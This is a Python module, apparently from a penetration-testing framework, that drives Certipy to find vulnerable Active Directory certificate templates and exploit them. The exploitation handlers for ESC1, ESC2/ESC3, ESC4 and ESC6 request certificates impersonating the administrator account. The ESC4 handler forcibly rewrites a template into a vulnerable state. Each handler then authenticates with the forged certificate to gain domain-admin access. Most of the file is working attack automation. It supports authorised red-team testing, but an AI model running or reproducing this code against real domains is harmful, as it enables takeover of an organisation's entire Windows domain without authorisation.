"""ADCS via Certipy: vulnerable-template discovery (auto) and ESC abuse (opt-in)."""
import os
import re

from .schema import DB, Vuln
from .nxcwrap import nxc, Cred
from .shell import run, stream, have
from .console import info, good, err, warn

_CA_NAME = re.compile(r'CA Name\s*:\s*(.+)')
_TEMPLATE = re.compile(r'Template Name\s*:\s*(.+)')
_ESC = re.compile(r'\b(ESC\d+)\b')
_PFX = re.compile(r"(?:[Ss]av(?:ing|ed)|Wrote)[^']*'([^']+\.pfx)'")

CERTIPY = 'certipy' if have('certipy') else 'certipy-ad'


def _certipy(*args: str, timeout: int = 180) -> str:
    return run(CERTIPY, *args, timeout=timeout)


# ---- discovery (runs in the pipeline) ---------------------------------

def find(db: DB, cred: Cred) -> None:
    """`certipy find -vulnerable` against each domain's DC, into the DB."""
    for domain in db._domains.values():
        if domain.dc is None:
            continue
        if cred.domain and db.domain(cred.domain) is not domain:
            continue
        key = f'adcs:{domain.name}:{cred.key()}'
        if db.store and db.store.is_done(key):
            continue

        user = f'{cred.username}@{domain.name}'
        output = _certipy('find', '-u', user, '-p', cred.secret, '-dc-ip', domain.dc.ip,
                          '-vulnerable', '-enabled', '-stdout', '-hide-admins')

        current_template = None
        for line in output.splitlines():
            t = _TEMPLATE.search(line)
            if t:
                current_template = t.group(1).strip()
                continue
            for esc in _ESC.findall(line):
                db.add_vuln(Vuln(
                    title=current_template or 'certificate template',
                    owner=domain.dc,
                    source='certipy',
                    esc=esc,
                    detail=line.strip()[:200],
                ))
        if db.store:
            db.store.mark_done(key)


def _ca_and_templates(output: str) -> tuple[str | None, dict[str, str]]:
    """From a `certipy find` run, return (CA name, {ESC: template})."""
    ca = None
    templates: dict[str, str] = {}
    current = None
    for line in output.splitlines():
        m = _CA_NAME.search(line)
        if m and ca is None:
            ca = m.group(1).strip()
        t = _TEMPLATE.search(line)
        if t:
            current = t.group(1).strip()
        for esc in _ESC.findall(line):
            if current and esc not in templates:
                templates[esc] = current
    return ca, templates


def _pfx(output: str) -> str | None:
    m = _PFX.search(output)
    return m.group(1) if m else None


# ---- exploitation (opt-in, operator-driven) ---------------------------

def exploit(domain: str, dc_ip: str, user: str, password: str, target: str,
            esc: str | None = None, ca: str | None = None, template: str | None = None,
            upn: str = 'administrator') -> None:
    user_at = f'{user}@{domain}'
    admin_upn = f'{upn}@{domain}'

    info(f'ADCS: enumerating vulnerable templates on {dc_ip}')
    found = _certipy('find', '-u', user_at, '-p', password, '-dc-ip', dc_ip,
                     '-vulnerable', '-enabled', '-stdout')
    found_ca, found_templates = _ca_and_templates(found)
    ca = ca or found_ca

    if esc is None:
        if not found_templates:
            err('ADCS: no vulnerable templates found')
            return
        esc = sorted(found_templates)[0]
        info(f'ADCS: no ESC specified, attempting {esc}')

    template = template or found_templates.get(esc)
    good(f'ADCS: CA={ca} template={template} esc={esc}')

    handler = _HANDLERS.get(esc)
    if handler is None:
        err(f'ADCS: {esc} abuse is not implemented')
        return
    if ca is None or (template is None and esc not in ('ESC6',)):
        err(f'ADCS: need a CA ({ca}) and template ({template}) to run {esc}')
        return

    handler(domain, dc_ip, user_at, password, target, admin_upn, ca, template, upn)


def _req(user_at, password, target, ca, template, extra):
    out = run(CERTIPY, 'req', '-u', user_at, '-p', password, '-target', target,
              '-ca', ca, '-template', template, *extra, timeout=180)
    print(out)
    return _pfx(out)


def _auth(pfx, dc_ip, extra=()):
    stream(CERTIPY, 'auth', '-pfx', pfx, '-dc-ip', dc_ip, *extra)


def _esc1(domain, dc_ip, user_at, password, target, admin_upn, ca, template, upn):
    pfx = _req(user_at, password, target, ca, template, ['-upn', admin_upn])
    if pfx:
        _auth(pfx, dc_ip)
    else:
        err('ADCS ESC1: certificate request failed')


def _esc2_esc3(domain, dc_ip, user_at, password, target, admin_upn, ca, template, upn):
    # enroll an enrollment-agent cert, then request on-behalf-of the target
    agent_pfx = _req(user_at, password, target, ca, template, [])
    if not agent_pfx:
        err('ADCS: agent certificate request failed')
        return
    out = run(CERTIPY, 'req', '-u', user_at, '-p', password, '-target', target, '-ca', ca,
              '-template', 'User', '-on-behalf-of', f'{domain.split(".")[0]}\\{upn}',
              '-pfx', agent_pfx, timeout=180)
    print(out)
    pfx = _pfx(out)
    if pfx:
        _auth(pfx, dc_ip)


def _esc4(domain, dc_ip, user_at, password, target, admin_upn, ca, template, upn):
    info('ADCS ESC4: rewriting template configuration to be vulnerable')
    # -force: skip the interactive confirmation (we capture output, no TTY)
    print(run(CERTIPY, 'template', '-u', user_at, '-p', password, '-dc-ip', dc_ip,
              '-template', template, '-write-default-configuration', '-force', timeout=180))
    pfx = _req(user_at, password, target, ca, template, ['-upn', admin_upn])
    if pfx:
        _auth(pfx, dc_ip)


def _esc6(domain, dc_ip, user_at, password, target, admin_upn, ca, template, upn):
    # CA has EDITF_ATTRIBUTESUBJECTALTNAME2: request any template with a chosen UPN
    pfx = _req(user_at, password, target, ca, template or 'User', ['-upn', admin_upn])
    if pfx:
        _auth(pfx, dc_ip)


_HANDLERS = {
    'ESC1': _esc1,
    'ESC2': _esc2_esc3,
    'ESC3': _esc2_esc3,
    'ESC4': _esc4,
    'ESC6': _esc6,
}
